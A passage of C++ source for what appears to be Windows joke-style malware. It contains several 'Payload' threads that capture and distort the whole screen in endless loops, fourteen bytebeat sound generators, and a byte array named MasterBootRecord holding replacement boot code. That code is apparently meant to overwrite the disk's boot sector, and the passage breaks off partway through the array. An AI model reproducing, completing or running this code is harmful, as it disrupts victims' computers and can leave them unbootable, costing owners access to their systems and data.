	bmpi.bmiHeader.biHeight = -h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpCopy = SelectObject(hdcCopy, bmp);
	srand(time(NULL));
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x, j = 4 * i;
				double fx = round(j - erff(cotf(j * (x / 16.f)) * 64) + acoshl(j * tanf(j * (y / 8.f))) + j + lgammaf(j * fabs((x + y) / 16.f)) + j + log1pf(j * sin(cbrt((x * x + y) * y) / 8.f)));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = (float)fmod((double)hslcolor.h + fx / 10000.f + 0.09f, 1.f);
				hslcolor.s = 1.f;
				if (hslcolor.l < .4f) { hslcolor.l += .4f; }
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		SelectObject(hdcCopy, bmpCopy);
		ReleaseDC(NULL, hdc);
		Sleep(1);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload10_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), i = 0;
	BITMAPINFO bmpi = { 0 };
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = -h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpCopy = SelectObject(hdcCopy, bmp);
	srand(time(NULL));
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;
				int cx = x - (w / 3), cy = y - (h / 3);
				float fx = floorf((cx ^ cy) ^ ((~cx & cy) << 3) ^ ((cx | cy) >> 2) | (i * ((cx ^ cy)) & 78));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / static_cast<float>(h) * 0.15f, 1.0f);
				hslcolor.s = fmod(hslcolor.s + (x % 20) / 200.0f, 1.0f);
				hslcolor.l = fmod(hslcolor.l + (y % 10) / 100.0f, 1.0f);
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		SelectObject(hdcCopy, bmpCopy);
		ReleaseDC(NULL, hdc);
		Sleep(1);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload11_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	PRGBTRIPLE triple;
	BITMAPINFO bmi = { 40, w, -h, 1, 24 };
	HBITMAP bmp = CreateDIBSection(hdc, &bmi, 0, (void**)&triple, 0, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpCopy = SelectObject(hdc, bmp);
	srand(time(NULL));
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < w * h; i++) {
			int x = i % w, y = i / h, t = y ^ y | x;
			triple[i].rgbtRed += int(fabs(i)) | t + 255;
			triple[i].rgbtGreen += int(cbrt(i)) | t + 255;
			triple[i].rgbtBlue += int(logf(i)) | t + 255;
		}
		int rw = rand() % w, rh = rand() % h, rs = rand() % 444;
		HBRUSH hbrush = CreateSolidBrush(RndRGB);
		HGDIOBJ hbrushCopy = SelectObject(hdcCopy, hbrush);
		BitBlt(hdcCopy, rand() % w, rand() % h, rand() % w, rand() % h, hdcCopy, rand() % w, rand() % h, NOTSRCCOPY);
		BitBlt(hdcCopy, rand() % w, rand() % h, 0, rand() % h, hdcCopy, rand() % w, rand() % h, SRCCOPY);
		BitBlt(hdcCopy, rw, 0, rs, h, hdcCopy, rw, 0, MERGECOPY);
		BitBlt(hdcCopy, 0, rh, w, rs, hdcCopy, 0, rh, SRCBRUSH);
		SelectObject(hdcCopy, hbrushCopy);
		DeleteObject(hbrush);
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		SelectObject(hdcCopy, bmpCopy);
		ReleaseDC(NULL, hdc);
		Sleep(10);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload13_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	PRGBTRIPLE rgbtriple;
	BITMAPINFO bmi = { 40, w, -h, 1, 24 };
	HBITMAP bmp = CreateDIBSection(hdc, &bmi, 0, (void**)&rgbtriple, 0, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpCopy = SelectObject(hdcCopy, bmp);
	srand(time(NULL));
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < w * h; i++) {
			int x = i % w, y = i / h;
			rgbtriple[i].rgbtRed += GetRValue(x + (y ^ y - x));
			rgbtriple[i].rgbtGreen += GetGValue(x + y | y >> x);
			rgbtriple[i].rgbtBlue += GetBValue(x & ~(y * y) ^ x);
		}
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		SetStretchBltMode(hdcCopy, COLORONCOLOR);
		StretchBlt(hdcCopy, 0, 0, w / 22, h / 22, hdc, 0, 0, w, h, SRCCOPY);
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w / 22, h / 22, SRCCOPY);
		SetStretchBltMode(hdcCopy, HALFTONE);
		StretchBlt(hdcCopy, 0, 0, w / 33, h / 33, hdc, 0, 0, w, h, SRCCOPY);
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w / 33, h / 33, SRCCOPY);
		SelectObject(hdcCopy, bmpCopy);
		ReleaseDC(NULL, hdc);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload14_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), i = 0;
	BITMAPINFO bmpi = { 0 };
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = -h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpCopy = SelectObject(hdcCopy, bmp);
	srand(time(NULL));
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;
				float fx = floor((h / 500.f) * ((asin(cosf(w * (x * PI / 180.f) / 1000.f))) * (atan(tanf(w * (y * PI / 180.f) / 1000.f))) + (acos(cosf((x * x) / 50333.f)) * asin(sinf((y * y) / 24678.f)))) * (25 + (2 * i)));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 100.f + y / h * .2f, 1.f);
				hslcolor.s = 1.f;
				if (hslcolor.l < 1.9178f) { hslcolor.l += 1.7891f; }
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		SelectObject(hdcCopy, bmpCopy);
		ReleaseDC(NULL, hdc);
		Sleep(1);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0x00;
}

VOID WINAPI bytebeat1() {
	int nSamplesPerSec = 13000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((((t * ((t >> 78) | (t << 13)) + t) & (129 + ((t >> 5) | (t << 2))))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat2() {
	int nSamplesPerSec = 16000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t ^ 13) + ((t >> 13) * (t / ((t >> 13 & 13) + 13)) & t) + 13));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat3() {
	int nSamplesPerSec = 19000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((((78 * t >> (t >> 155 & 56 & t >> 96)) * t >> 5 >> t * 56)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat4() {
	int nSamplesPerSec = 11025, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((13 * (t | t >> 91) & 255) * ((78 + ~t) >> 66 & (55 - t)) >> 6));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat5() {
	int nSamplesPerSec = 11025, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(128 * sin(((t % 24) * 9 + 1) * (t >> 7 + 8 & 13 | t >> 9 + 1 & 63)) + 128);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat6() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t * ((t >> 13 | t % 13 * t >> 78) & 78 * t >> 2 & 18)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat7() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((((78 * (t | t >> 13) & 666) * (78 | t >> 6 & 55) >> 8)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat8() {
	int nSamplesPerSec = 22050, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t ^ 13) + ((t >> 13) * (t | ((t >> 13 & 13) + 13)) & t) + 13));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat9() {//weirdest bytebeat
	int nSamplesPerSec = 32768, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t * (13 + (91 ^ t >> 1 & 3)) * (6 + (13 & t >> 24)) >> (t >> 78 & 13)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat10() {
	int nSamplesPerSec = 11025, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t * (t & 16384 ? (t >> 3) : (t - 1))) | t >> 3) | ((t * (572 & t >> 7)) - (t * (772 & t >> 14)) - (t * (972 & t >> 28))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat11() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t * (7 + ((t >> 8 & 9 | t >> 1) | t) + (t >> 6 + 8)))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat12() {
	int nSamplesPerSec = 22050, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t - ((t & (t >> 13)) + ~(t ^ (t >> 13)) * (t % 16384 ? (~(t << 1) | (t >> 7)) : ((t << 1) & ~(t >> 3))))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat13() {
	int nSamplesPerSec = 26000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t - ((t ^ (t / 13)) - (t | (t / 13))) + (t / 4096 ? (~(t << 1) | (t >> 7)) : ((t << 1) & ~(t >> 3)))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat14() {//messssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t * (t & 16384 ? 6 : 5) * (3 - (3 & t >> 9)) | (-t & 24576 ? (3 * t >> 5) % 192 : (t >> 4) % 192)) | (t * (t & 16384 ? 6 : 5) * (4 - (3 & t >> 8)) >> (3 & -t >> (t & 4096 ? 3 : 15))) | (t * (t & 16384 ? 6 : 5) * (3 + (1 & t >> 8)) >> (3 & t >> 8) | t >> 4) & (t * (t & 16384 ? 6 : 5) * (3 + (1 & t >> 7)) >> (3 & t >> 7) | t >> (t & 16384 ? 5 : 2))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
const unsigned char MasterBootRecord[] = { 0xBB,0xE0,0x07,0x8E,0xC3,0x8E,0xDB,0xB8,0x16,0x02,0xB9,0x02,0x00,0xB6,0x00,0xBB,0x00,0x00,0xCD,0x13,0x31,0xC0,0x89,0xC3,0x89,0xC1,0x89,0xC2,0xBE,0x00,0x00,0xBF,0x12,0x08,0xAC,0x81,0xFE,0x12,0x08,0x73,0x31,0x3C,0x80,0x73,0x02,0xEB,0x0F,0x24,0x7F,0x88,0xC1,0xAC,0xAA,0xFE,0xC9,0x80,0xF9,0xFF,0x75,0xF7,0xEB,0xE4,0xB4,0x00,0x3C,0x40,0x72,0x05,0x24,0x3F,0x88,0xC4,0xAC,0x89,0xC1,0xAD,0x89,0xF2,0x89,0xFE,0x29,0xC6,0xAC,0xAA,0xE2,0xFC,0x89,0xD6,0xEB,0xC8,0xB8,0x13,0x00,0xCD,0x10,0xBB,0xE0,0x07,0x8E,0xDB,0xBE,0x12,0x08,0xB4,0x00,0xAC,0xBB,0x00,0x00,0x89,0xC1,0xBA,0xC8,0x03,0x88,0xD8,0xEE,0x43,0xBA,0xC9,0x03,0xAC,0xEE,0xAC,0xEE,0xAC,0xEE,0xE2,0xEE,0xBB,0x00,0xA0,0x8E,0xC3,0xBF,0x00,0x00,0xB9,0x00,0x7D,0xF3,0xA5,0xF4,0xEB,0xFD,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0